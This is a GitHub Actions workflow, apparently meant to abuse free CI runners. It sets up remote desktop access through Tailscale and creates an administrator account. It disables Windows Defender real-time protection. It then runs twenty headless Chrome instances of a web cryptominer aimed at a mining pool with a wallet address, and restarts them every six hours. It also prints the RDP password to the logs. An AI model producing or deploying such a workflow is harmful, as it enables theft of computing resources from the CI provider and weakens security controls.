name: RDP Auto-Recreate + Miner

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"  # ŸÉŸÑ 6 ÿ≥ÿßÿπÿßÿ™

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
  MAX_RUNTIME: 340       # 5h40m
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
  MINER_INSTANCES: 20    # ÿπÿØÿØ ŸÜŸàÿßŸÅÿ∞ Chrome

jobs:
  rdp:
    runs-on: windows-latest
    timeout-minutes: 340

    steps:
      - name: Enable RDP
        run: |
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: Create RDP User
        run: |
          $secure = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force

          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
            New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
            Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          } else {
            Set-LocalUser -Name $env:RDP_USER -Password $secure
          }

          Write-Host "‚úÖ RDP User Ready: $env:RDP_USER"

      - name: Install Tailscale
        run: |
          $ts = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest $ts -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer

      - name: Connect Tailscale
        run: |
          Start-Service Tailscale
          Start-Sleep -Seconds 5
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --reset --authkey ${{ secrets.TAILSCALE_AUTH_KEY }} --hostname "GH-RDP-${{ github.run_id }}"
          $ip = (& "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4)
          echo "TS_IP=$ip" >> $env:GITHUB_ENV
          Write-Host "‚úÖ Tailscale IP: $ip"

      - name: Optimize Windows
        run: |
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN
          Set-MpPreference -DisableRealtimeMonitoring $true

      - name: Launch Miner Windows
        run: |
          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
          if (-not (Test-Path $chromePath)) {
              Write-Host "‚ùå Chrome not installed"
              exit 1
          }

          for ($i=1; $i -le $env:MINER_INSTANCES; $i++) {
              Start-Process $chromePath -ArgumentList "--headless --disable-gpu --no-sandbox --remote-debugging-port=$((9222 + $i)) --kiosk $env:MINER_URL"
              Write-Host "‚úÖ Launched Miner Window $i"
          }

      - name: Monitor Miner & Keep Alive
        run: |
          $totalMinutes = [int]$env:MAX_RUNTIME
          $checkInterval = 1

          for ($elapsed=0; $elapsed -lt $totalMinutes; $elapsed += $checkInterval) {
              Write-Host "‚è± RDP Session Active - Minute $elapsed / $totalMinutes"

              # ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑŸÜŸàÿßŸÅÿ∞ Ÿàÿ•ÿπÿßÿØÿ© ÿ™ÿ¥ÿ∫ŸäŸÑ ÿ£Ÿä ŸÜÿßŸÅÿ∞ÿ© ÿ™ŸàŸÇŸÅÿ™
              $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
              if ($chromeProcesses.Count -lt $env:MINER_INSTANCES) {
                  $missing = $env:MINER_INSTANCES - $chromeProcesses.Count
                  Write-Host "‚ö† $missing Chrome windows missing, restarting..."
                  for ($j=1; $j -le $missing; $j++) {
                      Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless --disable-gpu --no-sandbox --remote-debugging-port=$((9222 + $j)) --kiosk $env:MINER_URL"
                  }
              }

              Start-Sleep -Seconds ($checkInterval * 60)
          }

      - name: Display RDP Info
        run: |
          Write-Host "==========================================="
          Write-Host "üöÄ RDP + Miner Ready"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: $env:RDP_USER"
          Write-Host "Pass: $env:RDP_PASSWORD"
          Write-Host "Duration: $env:MAX_RUNTIME min"
          Write-Host "Chrome Windows: $env:MINER_INSTANCES"
          Write-Host "URL: $env:MINER_URL"
          Write-Host "==========================================="

      - name: Cleanup
        if: always()
        run: |
          Write-Host "üßπ Cleaning up..."
          Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
          Write-Host "‚úÖ Cleanup Completed"
